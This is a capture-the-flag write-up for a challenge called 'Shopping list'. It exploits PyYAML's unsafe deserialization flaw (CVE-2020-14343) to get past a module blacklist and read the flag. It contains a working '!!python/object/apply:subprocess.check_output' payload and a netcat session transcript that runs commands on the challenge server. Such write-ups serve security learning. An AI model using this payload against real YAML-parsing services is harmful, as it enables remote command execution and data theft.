# Shopping list
Author: [Stratulat Dragoș](https://www.linkedin.com/in/stratulat-dragos-6b9a09227)

## Description
```
Exposing server errors on the client side and leak information about the library modules used by the server.
```

## Requirements
- PyYaml module CVE-2020-14343

## Solve

**Connection and Options**

Connect to the server. <br>
After entering a username, the server presents two options. <br>
Opting for the first choice allows adding a new list in a JSON-like format. <br>

**Valid List Entry**

Provide a correctly formatted list to observe the response. <br>
Check the second option to verify if the list got stored. <br>

**Error Detection with PyYAML Module**

Encounter an error indicating the server's usage of the PyYAML module. <br>
This module has a known CVE that enables arbitrary code execution; the server implemented a blacklist mechanism though. <br>

**Discovery of Allowed Module**

After several attempts, find that the subprocess module isn't blacklisted. <br>
Attempt to execute `ls` to examine the output. <br>
Discovered the `cat` command was blacklisted.

**Successful Approach**

Attempted using `grep –r "CSCTF{}` as the flag format. <br>
Successfully retrieved the flag with the following payload:

```json
{!!python/object/apply:subprocess.check_output [["grep", "-r", "CSCTF"]]}
```

<br>

```bash
nc chal.chronossec.site 30190
Enter your username: chronos
Hello, chronos

[+] Welcome to our super secure shopping list application.
[+] Press [1] to add a new list
[+] Press [2] to see your lists
1

Enter your list with the following format {[product name]: [quantity]}.
Example: {apples: 10, bananas: 5}
{!!python/object/apply:subprocess.check_output [["grep", "-r", "CSCTF"]]}

[+] Welcome to our super secure shopping list application.
[+] Press [1] to add a new list
[+] Press [2] to see your lists
2
[*] Here are your lists:
List 0
{b'flag.txt:CSCTF{y3T_@n0Th3R_Rc3_vUln3R@B1L17Y}\n': None}


[+] Welcome to our super secure shopping list application.
[+] Press [1] to add a new list
[+] Press [2] to see your lists
```

<br>

> Flag: `CSCTF{y3T_@n0Th3R_Rc3_vUln3R@B1L17Y}`